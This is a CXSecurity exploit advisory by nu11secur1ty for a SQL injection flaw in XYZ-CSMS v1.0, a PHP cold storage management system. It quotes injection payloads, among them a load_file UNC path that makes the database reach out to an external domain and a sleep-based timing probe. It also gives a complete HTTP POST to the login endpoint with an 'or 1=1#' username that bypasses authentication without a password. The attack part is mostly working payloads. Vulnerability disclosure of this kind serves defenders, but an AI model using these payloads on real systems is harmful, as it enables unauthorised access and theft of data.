---
title: XYZ-CSMS (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication
url: https://cxsecurity.com/issue/WLB-2024120017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-17
fetch_date: 2025-10-06T19:38:00.172774
---

# XYZ-CSMS (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **XYZ-CSMS (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication** **2024.12.16**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: XYZ-CSMS (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication
## Author: nu11secur1ty
## Date: 12/16/2024
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/15088/simple-cold-storage-management-system-using-phpoop-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `username` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\uywkt7rin9jxhw5fjoazxa5yqpwik980bo3btzi.ovchartup.com\\lsm'))+' was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. Additionally, a single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present. Additionally, the payload '+(select\*from(select(sleep(20)))a)+' was submitted in the username parameter. The application took 20009 milliseconds to respond to the request, compared with 30 milliseconds for the original request, indicating that the injected SQL command caused a time delay. The attacker can get all sensitive information from this system when he attacks it online, He can login super easily WITHOUT PASSWORD - ONLY USER - bypassing, and can crash or get every sensitive information from him!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- SQLi-Bypass login authentication:
```POST
POST /csms/classes/Login.php?f=login HTTP/1.1
Host: pwnedhost.com
Cookie: PHPSESSID=cbnub20m3ellr9jv6e7uni4ka9
Content-Length: 44
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not\_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: \*/\*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://pwnedhost.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pwnedhost.com/csms/admin/login.php
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
username=nu11secur1ty'+or+1%3D1%23&password=
```
## Reproduce:
[href](https://www.patreon.com/posts/xyz-csms-v1-118066273?)
## Demo PoC:
[href](https://www.patreon.com/posts/xyz-csms-v1-118066273)
## Time spent:
00:07:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top